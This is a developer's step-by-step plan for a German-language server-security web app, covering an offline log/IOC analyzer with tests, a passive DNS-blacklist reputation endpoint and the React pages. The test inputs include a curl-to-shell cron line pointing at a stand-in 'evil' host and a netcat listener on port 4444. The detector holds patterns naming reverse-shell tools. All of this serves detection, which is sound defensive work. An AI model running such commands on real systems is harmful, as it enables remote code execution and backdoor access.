import { analyze } from './ioc.js';

describe('ioc analyze', () => {
  it('flags a high-CPU random-named process (miner pattern)', () => {
    const ps = 'USER PID %CPU COMMAND\nroot 1234 1599 aa162766';
    const f = analyze(ps);
    expect(f.some((x) => x.severity === 'high' && /CPU/i.test(x.title))).toBe(true);
  });
  it('flags a known miner name', () => {
    const f = analyze('root 22 4.0 /usr/bin/xmrig --donate 1');
    expect(f.some((x) => /miner|xmrig/i.test(x.title + x.detail))).toBe(true);
  });
  it('flags execution from /tmp', () => {
    const f = analyze('root 90 0.1 /tmp/.x/kdevtmpfsi');
    expect(f.some((x) => /tmp|dev\/shm/i.test(x.detail))).toBe(true);
  });
  it('flags a curl-pipe-shell cron line', () => {
    const f = analyze('*/5 * * * * curl -s http://evil/x.sh | sh');
    expect(f.some((x) => /cron|pipe|shell/i.test(x.title))).toBe(true);
  });
  it('flags a listening backdoor-ish port bound to 0.0.0.0', () => {
    const f = analyze('LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=9,fd=3))');
    expect(f.some((x) => /port|listen/i.test(x.title))).toBe(true);
  });
  it('returns no findings for benign input', () => {
    expect(analyze('root 1 0.0 /usr/lib/systemd/systemd').length).toBe(0);
  });
});
```

- [ ] **Step 2: Run; expect fail**

Run: `npx vitest run src/lib/ioc.test.js`
Expected: FAIL — `analyze` not defined.

- [ ] **Step 3: Implement `src/lib/ioc.js`**

```js
// Offline heuristic IOC analyzer. Input = pasted command output
// (ps/top, ss/netstat, crontab, auth.log). Output = findings[].
// HEURISTIC ONLY — never proof of compromise.

const MINER_NAMES = /\b(xmrig|kinsing|kdevtmpfsi|kthreaddi|tsm|minerd|cnrig|xmr-stak|ddgs|systemten|watchdogs)\b/i;
const SUS_DIRS = /(?:^|\s|=|"|')(\/tmp\/|\/dev\/shm\/|\/var\/tmp\/)/;
const PIPE_SHELL = /\b(?:curl|wget|fetch)\b[^\n|]*\|\s*(?:ba|z|da)?sh\b/i;
const RANDOM_NAME = /\b[a-z]{2}\d{4,}\b|\b[a-z0-9]{8,}\b/i; // crude: long/random-looking token
const BACKDOOR_PORTS = new Set(['4444', '1337', '31337', '6666', '12345', '5555', '9001']);
const NC_LIKE = /\b(nc|ncat|netcat|socat|bash -i|sh -i)\b/i;

function pushUnique(arr, finding) {
  if (!arr.some((f) => f.title === finding.title && f.line === finding.line)) arr.push(finding);
}

export function analyze(text) {
  const findings = [];
  const lines = String(text || '').split('\n');
  for (const raw of lines) {
    const line = raw.trim();
    if (!line) continue;

    // miner names anywhere
    if (MINER_NAMES.test(line))
      pushUnique(findings, { severity: 'high', title: 'Bekannter Miner/Malware-Name',
        detail: line, line });

    // execution from suspicious dirs
    if (SUS_DIRS.test(line))
      pushUnique(findings, { severity: 'high', title: 'Ausführung aus verdächtigem Verzeichnis',
        detail: line, line });

    // curl|sh cron / shell pipe
    if (PIPE_SHELL.test(line))
      pushUnique(findings, { severity: 'high', title: 'Download nach Shell gepiped (cron/pipe/shell)',
        detail: line, line });

    // high CPU% from ps/top: find a number > 80 followed by a random-looking command
    const cpu = line.match(/\b(\d{2,4})(?:\.\d+)?\b/);
    if (cpu && Number(cpu[1]) >= 80 && RANDOM_NAME.test(line) && !/\b(java|node|postgres|mysql|chrome|firefox)\b/i.test(line))
      pushUnique(findings, { severity: 'high', title: 'Hohe CPU-Last mit zufällig wirkendem Prozessnamen',
        detail: line, line });

    // listening backdoor-ish port
    const port = line.match(/0\.0\.0\.0:(\d+)/);
    if (port && (BACKDOOR_PORTS.has(port[1]) || NC_LIKE.test(line)))
      pushUnique(findings, { severity: 'medium', title: 'Verdächtiger lauschender Port',
        detail: line, line });

    // reverse shell tool
    if (NC_LIKE.test(line) && /-e\b|\/bin\/(ba)?sh|>&/.test(line))
      pushUnique(findings, { severity: 'high', title: 'Mögliche Reverse Shell',
        detail: line, line });

    // suspicious accepted root logins from auth.log
    if (/Accepted (password|publickey) for root/i.test(line))
      pushUnique(findings, { severity: 'medium', title: 'Root-Login akzeptiert',
        detail: line, line });
  }
  return findings;
}
```
> The benign-input test must yield zero findings: `RANDOM_NAME` matches long tokens, so the CPU rule is gated by `>= 80` CPU **and** non-allowlisted name. Keep the allowlist (`systemd`, `java`, etc.) broad enough that the benign sample (`/usr/lib/systemd/systemd`, CPU `0.0`) produces nothing.

- [ ] **Step 4: Run; iterate until green**

Run: `npx vitest run src/lib/ioc.test.js`
Expected: PASS (6 tests). If the benign test fails, tighten the CPU/random-name gate; if a positive test fails, widen the matching regex. Re-run until all pass.

- [ ] **Step 5: Commit**

```bash
git add src/lib/ioc.js src/lib/ioc.test.js
git commit -m "feat: offline IOC analyzer detectors with tests"
```

---

### Task 11: Backend `/api/reputation` (passive DNS reputation)

**Files:**
- Modify: `server.js`, `server.test.js`

- [ ] **Step 1: Write failing test for the reverse-name + classifier helpers**

Append to `server.test.js`:
```js
import { reverseIp, classifyZone } from './server.js';
test('reverseIp builds the DNSBL query label', () => {
  assert.equal(reverseIp('1.2.3.4'), '4.3.2.1');
});
test('classifyZone tags botnet vs spam lists', () => {
  assert.equal(classifyZone('dnsbl.dronebl.org'), 'botnet');
  assert.equal(classifyZone('cbl.abuseat.org'), 'botnet');
  assert.equal(classifyZone('bl.spamcop.net'), 'spam');
});
```

- [ ] **Step 2: Run; expect fail**

Run: `node --test server.test.js`
Expected: FAIL — helpers not exported.

- [ ] **Step 3: Implement helpers + endpoint in `server.js`**

```js
export const reverseIp = (ip) => ip.split('.').reverse().join('.');

const BOTNET_ZONES = new Set(['dnsbl.dronebl.org', 'cbl.abuseat.org', 'xbl.spamhaus.org']);
export function classifyZone(zone) {
  if (BOTNET_ZONES.has(zone) || /drone|cbl|xbl|bot/i.test(zone)) return 'botnet';
  return 'spam';
}

const REP_ZONES = [
  'zen.spamhaus.org', 'cbl.abuseat.org', 'dnsbl.dronebl.org',
  'bl.spamcop.net', 'b.barracudacentral.org',
];

async function apiReputation({ ip }) {
  if (net.isIP(ip) !== 4) throw new Error('Bitte IPv4');
  const rev = reverseIp(ip);
  const listings = await Promise.all(REP_ZONES.map(async (zone) => {
    const q = `${rev}.${zone}`;
    try {
      const codes = await dns.resolve4(q);
      let reason = null;
      try { reason = (await dns.resolveTxt(q)).map((t) => t.join('')).join(' '); } catch { /* none */ }
      return { zone, listed: true, kind: classifyZone(zone), codes, reason };
    } catch (e) {
      if (e.code === 'ENOTFOUND' || e.code === 'ENODATA') return { zone, listed: false, kind: classifyZone(zone) };
      return { zone, listed: false, kind: classifyZone(zone), error: e.code || String(e) };
    }
  }));
  let ptr = null;
  try { ptr = await dns.reverse(ip); } catch { ptr = null; }
  let abuse = null;
  try {
    const rdap = await rdapFetch('https://rdap.org/ip/' + encodeURIComponent(ip));
    const emails = [];
    for (const ent of rdap.entities || [])
      for (const v of (ent.vcardArray?.[1] || []))
        if (v[0] === 'email') emails.push(v[3]);
    abuse = emails[0] || null;
  } catch { abuse = null; }

  const botnet = listings.filter((l) => l.listed && l.kind === 'botnet').length;
  const spam = listings.filter((l) => l.listed && l.kind === 'spam').length;
  return { ip, ptr, abuse, listings,
    summary: { botnet, spam,
      verdict: botnet > 0 ? 'kompromittiert/botnet-verdächtig' : spam > 0 ? 'auf Spam-Listen' : 'sauber' } };
}
```
Register: `'/api/reputation': apiReputation,`. (`rdapFetch` already exists in `server.js`.)

- [ ] **Step 4: Run; expect pass**

Run: `node --test server.test.js`
Expected: PASS.

- [ ] **Step 5: Manual check**

Run `npm start`:
```bash
curl -s -XPOST localhost:8099/api/reputation -H 'content-type: application/json' -d '{"ip":"127.0.0.2"}'
```
Expected: JSON with `listings`, `summary` (127.0.0.2 is the canonical DNSBL test address and is usually listed → `botnet`/`spam` counts > 0). Stop the server.

- [ ] **Step 6: Commit**

```bash
git add server.js server.test.js
git commit -m "feat: passive /api/reputation (DNSBL + DroneBL + PTR + RDAP abuse)"
```

---

### Task 12: `/infected` page (Ark UI Tabs: reputation + IOC)

**Files:**
- Modify: `src/pages/Infected.jsx`

- [ ] **Step 1: Implement `src/pages/Infected.jsx`**

```jsx
import { useState } from 'react';
import { Tabs } from '@ark-ui/react/tabs';
import { api } from '../lib/api.js';
import { analyze } from '../lib/ioc.js';

function ReputationTab() {
  const [ip, setIp] = useState('');
  const [state, setState] = useState({ status: 'idle', data: null, error: '' });
  const run = async () => {
    setState({ status: 'loading', data: null, error: '' });
    try { const data = await api('/api/reputation', { ip });
      setState({ status: 'done', data, error: '' }); }
    catch (e) { setState({ status: 'error', data: null, error: e.message }); }
  };
  const d = state.data;
  return (
    <div>
      <p className="note">Passiv: nur DNS-basierte Blacklist-/Botnet-Abfragen + RDAP. Kein Scan deines Servers.</p>
      <input value={ip} placeholder="Server-IPv4, z. B. 203.0.113.10" onChange={(e) => setIp(e.target.value)} />
      <button type="button" onClick={run}>Prüfen</button>
      {state.status === 'loading' && <p>Prüfe…</p>}
      {state.status === 'error' && <p className="result error">{state.error}</p>}
      {state.status === 'done' && d && (
        <div>
          <p className={'result ' + (d.summary.botnet ? 'error' : d.summary.spam ? '' : 'ok')}>
            Verdikt: {d.summary.verdict} (Botnet-Listen: {d.summary.botnet}, Spam-Listen: {d.summary.spam})
          </p>
          {d.ptr && <p>PTR: {d.ptr.join(', ')}</p>}
          {d.abuse && <p>Abuse-Kontakt: {d.abuse}</p>}
          <ul>{d.listings.filter((l) => l.listed).map((l) => (
            <li key={l.zone} className={l.kind === 'botnet' ? 'result error' : ''}>
              {l.zone} [{l.kind}] {l.reason ? '— ' + l.reason : ''}</li>
          ))}</ul>
        </div>
      )}
    </div>
  );
}

function IocTab() {
  const [text, setText] = useState('');
  const findings = text.trim() ? analyze(text) : [];
  return (
    <div>
      <p className="note">100 % offline. Füge Ausgaben ein von z. B.
        <code> ps aux</code>, <code>ss -tlnp</code>, <code>crontab -l</code>, <code>/var/log/auth.log</code>.
        Heuristik — kein Beweis für Kompromittierung.</p>
      <textarea rows={10} value={text} placeholder="Befehlsausgabe hier einfügen…"
        onChange={(e) => setText(e.target.value)} style={{ width: '100%' }} />
      {text.trim() && (findings.length === 0
        ? <p className="result ok">✓ Keine auffälligen Muster gefunden.</p>
        : <ul className="findings">{findings.map((f, i) => (
            <li key={i} className={'sev-' + f.severity}>
              <strong>[{f.severity}]</strong> {f.title}<br /><code>{f.detail}</code>
            </li>
          ))}</ul>)}
    </div>
  );
}

export default function Infected() {
  return (
    <div>
      <h1>Ist mein Server infiziert?</h1>
      <Tabs.Root defaultValue="rep">
        <Tabs.List>
          <Tabs.Trigger value="rep">IP-Reputation</Tabs.Trigger>
          <Tabs.Trigger value="ioc">Log-Analyse (offline)</Tabs.Trigger>
          <Tabs.Indicator />
        </Tabs.List>
        <Tabs.Content value="rep"><ReputationTab /></Tabs.Content>
        <Tabs.Content value="ioc"><IocTab /></Tabs.Content>
      </Tabs.Root>
    </div>
  );
}
```

- [ ] **Step 2: Add severity styles to `theme.css`**

```css
.findings li, .breaches li { margin: .4rem 0; }
.sev-high { color: #ff8a8a; } .sev-medium { color: #ffcf8a; } .sev-low { color: #cdd0ff; }
code { background: #0003; padding: 0 .3em; border-radius: 4px; }
```

- [ ] **Step 3: Verify in browser**

Run `npm run dev`, open `/infected`. IOC tab: paste `root 1234 1599 aa162766` → a high-severity finding appears. Reputation tab: enter `127.0.0.2` → verdict shows listed. Stop the dev server.

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "feat: /infected page with IP reputation + offline IOC analyzer"
```

---

## Phase D — Home, render tests, docs, final verification (Tasks 13–16)

### Task 13: Home page

**Files:**
- Modify: `src/pages/Home.jsx`

- [ ] **Step 1: Implement `src/pages/Home.jsx`**

```jsx
import { Link } from 'react-router-dom';

const CARDS = [
  { to: '/tools', title: 'Tools', desc: '72 Encode/Decode-, Crypto-, Daten-, Text-, Farb-, Mathe- und Netzwerk-Tools.' },
  { to: '/pwned', title: 'Have I Been Pwned', desc: 'Passwort (k-anonym, lokal gehasht) und E-Mail (mit HIBP_KEY) gegen Datenlecks prüfen.' },
  { to: '/infected', title: 'Server infiziert?', desc: 'Passive IP-Reputation + offline Log-/IOC-Analyse.' },
];

export default function Home() {
  return (
    <div>
      <h1>🛠 Server Tools</h1>
      <p>Ein Hub kleiner Web-Tools. Offline-Tools laufen im Browser; das Backend ist
        <strong> passiv</strong> — es verbindet nur zu DNS-Resolvern, RDAP und festen,
        bekannten HIBP-Endpunkten. Kein Port-Scanner, keine SSRF.</p>
      <div className="grid">
        {CARDS.map((c) => (
          <Link key={c.to} to={c.to} className="card home-card">
            <h3>{c.title}</h3><p>{c.desc}</p>
          </Link>
        ))}
      </div>
    </div>
  );
}
```

- [ ] **Step 2: Verify + commit**

Run `npm run dev`, open `/`, confirm three cards link correctly. Stop dev server.
```bash
git add src/pages/Home.jsx && git commit -m "feat: Home landing page"
```

---

### Task 14: Render smoke tests for all pages + ToolCard

**Files:**
- Create: `src/pages/pages.test.jsx`
- Maybe modify: `vitest.setup.js`

- [ ] **Step 1: Write the render smoke tests**

`src/pages/pages.test.jsx`:
```jsx
import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import Home from './Home.jsx';
import Tools from './Tools.jsx';
import Pwned from './Pwned.jsx';
import Infected from './Infected.jsx';
import ToolCard from '../components/ToolCard.jsx';
import { TOOLS } from '../tools/index.js';

const wrap = (ui) => render(<MemoryRouter>{ui}</MemoryRouter>);

describe('pages render without crashing', () => {
  it('Home', () => { expect(() => wrap(<Home />)).not.toThrow(); });
  it('Tools (renders all ToolCards)', () => { expect(() => wrap(<Tools />)).not.toThrow(); });
  it('Pwned', () => { expect(() => wrap(<Pwned />)).not.toThrow(); });
  it('Infected', () => { expect(() => wrap(<Infected />)).not.toThrow(); });
  it('ToolCard with mixed input types (password tool)', () => {
    const pass = TOOLS.find((t) => t.id === 'pass'); // has number + checkbox inputs
    expect(() => render(<ToolCard tool={pass} />)).not.toThrow();
  });
});
```

- [ ] **Step 2: Run the tests**

Run: `npx vitest run src/pages/pages.test.jsx`
Expected: PASS (5 tests).

> If Ark UI's `Tabs`/`Checkbox` throw in jsdom because `ResizeObserver`/`matchMedia`
> are missing, add these polyfills to `vitest.setup.js` and re-run:
> ```js
> globalThis.ResizeObserver ||= class { observe() {} unobserve() {} disconnect() {} };
> globalThis.matchMedia ||= () => ({ matches: false, addEventListener() {}, removeEventListener() {} });
> ```

- [ ] **Step 3: Commit**

```bash
git add src/pages/pages.test.jsx vitest.setup.js
git commit -m "test: render smoke tests for all pages + ToolCard"
```

---

### Task 15: Update docs (README, package.json description)

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Rewrite `README.md`**

Replace the "Sicherheit / Abuse" and intro sections so they:
- Drop "Keine npm-Dependencies / Null Supply-Chain-Risiko".
- State the stack: React + Ark UI (Vite), passive Node backend.
- Keep/emphasize: backend is passive — talks only to system DNS resolvers, `rdap.org`, `api.pwnedpasswords.com`, and (only if `HIBP_KEY` is set) `haveibeenpwned.com`. No port-scanner, no SSRF, no connections to arbitrary user-supplied hosts.
- Document scripts: `npm run dev`, `npm run build`, `npm start`, `npm test`.
- Document the optional `HIBP_KEY` env var (enables the e-mail breach check).
- Update the routes list (`/`, `/tools`, `/pwned`, `/infected`).

- [ ] **Step 2: Commit**

```bash
git add README.md && git commit -m "docs: update README for React stack + security tools"
```

---

### Task 16: Full build + test + final verification

- [ ] **Step 1: Run the whole test suite**

Run:
```bash
npx vitest run
node --test server.test.js
```
Expected: all Vitest tests pass; all node:test backend tests pass.

- [ ] **Step 2: Production build + smoke test every route**

Run: `npm run build && npm start`. In a browser visit `/`, `/tools` (run one tool per category + one backend DNS tool), `/pwned` (password "password" → found), `/infected` (IOC paste + reputation `127.0.0.2`). Reload on a deep route to confirm SPA fallback. Stop the server.

- [ ] **Step 3: Final commit / tag**

```bash
git add -A
git commit -m "chore: final build + verification for v0.2.0" --allow-empty
```

---

## Notes for the implementer

- **Ark UI import paths:** the plan uses subpath imports (`@ark-ui/react/tabs`). If the installed version only ships the barrel, switch every Ark UI import to `import { Tabs, Field, Checkbox } from '@ark-ui/react'`. Decide once in Task 3 Step 4 and stay consistent.
- **Passive guarantee is a hard constraint:** never add an endpoint that connects to a user-supplied host/port. All new upstreams are fixed: `api.pwnedpasswords.com`, `haveibeenpwned.com`, `rdap.org`, system DNS. Keep validation, rate-limit, timeout, and size caps on every new endpoint.
- **Disclaimers are product requirements**, not decoration: the password tab must state the password never leaves the browser; the IOC tab and reputation tab must state results are heuristic/passive, not proof.
- **TDD applies to pure logic** (`ioc.js`, `hibp.js`, the `server.js` helpers). UI tasks are verified by running dev/build and observing behavior, which is the honest verification for scaffolding/markup.
```
